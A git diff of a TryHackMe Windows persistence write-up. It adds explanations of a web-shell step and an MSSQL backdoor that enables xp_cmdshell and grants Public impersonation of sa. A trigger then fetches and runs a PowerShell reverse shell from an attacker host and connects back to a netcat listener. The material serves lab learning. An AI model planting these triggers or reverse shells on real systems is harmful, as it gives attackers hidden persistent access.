@@ -3,7 +3,7 @@ Module link: https://tryhackme.com/room/windowslocalpersistence
 
 **Please feel free to point out any errors that you may see in this writeup!**
 
-This writeup was last updated: 07/06/2023
+This writeup was last updated: 07/08/2023
 
 # Using Web Shells
 1. Started this room's machine
@@ -62,22 +62,23 @@ PS C:\Users\Administrator> explorer.exe http://10.10.219.169/shell.aspx
 
 ![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/ASPX.NET%20Web%20Shell%20Open.png)
 
-9. `C:\flags\flag16.exe` from our compromised Windows machine's web shell to run the **flag16.exe**  
+9. `C:\flags\flag16.exe` from our compromised Windows machine's web shell to run the **flag16.exe**, which ended up displaying this task's flag onto our web shell terminal 
 
 ![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/ASPX.NET%20Web%20Shell%20Flag.png)
 
 # Using MSSQL as a Backdoor
 1. Started this room's machine
-2. Search for **Microsoft SQL Server Management Studio 18** and launch it
+2. Search for Microsoft's **Microsoft SQL Server Management Studio 18**, launch it, and then press connect to start using it
 
 ![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/MSSQL%20Search.png)
 
 ![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/MSSQL%20Launch%20pt2.png)
 
-3. Launch and execute the following four queries:
+3. Once the MSSQL Serve Manager has successfully been launched, execute the following four queries:
 
 ![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/MSSQL%20Launch%20pt.3.png)
 
+The first query we'll execute is to enable the **xp_cmdshell** stored procedure, which is a procedure that's provided and disabled by default in any MSSQL installation, and allows us to run commands directly in the system's console
 ```SQL
 sp_configure 'Show Advanced Options',1;
 RECONFIGURE;
@@ -90,6 +91,7 @@ GO
 
 ![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/MSSQL%20Query%201.png)
 
+The second query we'll execute is to ensure that any website and any user accessing the database can run **xp_cmdshell** by granting privileges to all users to impersonate the **sa** (system administrator) user, which is the default database administrator, since only database users with the **sysadmin** role can run the **xp_cmdshell** procedure by default
 ```SQL
 USE master
 
@@ -98,12 +100,14 @@ GRANT IMPERSONATE ON LOGIN::sa to [Public];
 
 ![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/MSSQL%20Query%202.png)
 
+The third query we'll execute is to specify and switch to the database that we want to execute the fourth query in, which was the **HRDB** database
 ```SQL
 USE HRDB
 ```
 
 ![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/MSSQL%20Query%203.png)
 
+The fourth and last query we'll execute is to configure a trigger that'll download a PowerShell script that we'll create on our attack machine from our attack machine and then execute it whenever an **INSERT** action is made into the **HRDB** database's **Employees** table
 ```SQL
 CREATE TRIGGER [sql_backdoor]
 ON HRDB.dbo.Employees 
@@ -115,7 +119,7 @@ EXEC master..xp_cmdshell 'Powershell -c "IEX(New-Object net.webclient).downloads
 
 ![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/MSSQL%20Query%204.png)
 
-4. `mousepad <POWERSHELL SCRIPT>.ps1` and
+4. `mousepad <POWERSHELL SCRIPT>.ps1` from our Linux attack machinea and insert the following reverse shell PowerShell payload inside 
 ```PowerShell
 $client = New-Object System.Net.Sockets.TCPClient("<ATTACK MACHINE IP>",<PORT NUMBER>);
 $stream = $client.GetStream();
@@ -133,17 +137,17 @@ $client.Close()
 
 ![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Creating%20evilscript.ps1.png)
 
-5. `nc -lvnp <PORT NUMBER>`
+5. `nc -lvnp <PORT NUMBER>` from our Linux attack machine to open up a netcat listener that'll listen for any inbound connections
 ```Bash
 root@ip-10-10-32-42:~# nc -lvnp 9999
 Listening on [0.0.0.0] (family 0, port 9999)
 ```
-6. `sudo python -m http.server`
+6. `sudo python -m http.server` from our Linux attack machine to start a simple HTTP server on our attack machine to allow our compromised Windows machine to connect to our attack machine and download the payload that we just created once the trigger we had set up gets triggered
 ```Bash
 root@ip-10-10-32-42:~# sudo python -m http.server
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 ```
-7. `explorer.exe http://<TARGET IP>/`
+7. `explorer.exe http://<TARGET IP>/` from the compromised Windows machine to launch the Windows Explorer web browser and redirect it to the target's IP address, which brought us to a web page from where we can add users into the target's HRDB database to trigger the trigger that we inserted using their MSSQL Server Manager, which ended up working after doing so and creating a reverse shell that connected back to our attack machine's netcat listener that we just had previously set up
 ```PowerShell
 C:\Users\Administrator>explorer.exe "http://10.10.138.69/"
 ```
@@ -158,7 +162,7 @@ Listening on [0.0.0.0] (family 0, port 9999)
 Connection from 10.10.138.69 49758 received!
 ```
 
-8. `C:\flags\flag17.exe`
+8. `C:\flags\flag17.exe` from the reverse shell to run the **flag17.exe** program, which ended up displaying this task's flag onto our terminal
 ```PowerShell
 PS C:\Windows\system32> C:\flags\flag17.exe
 THM{I_LIVE_IN_YOUR_DATABASE}
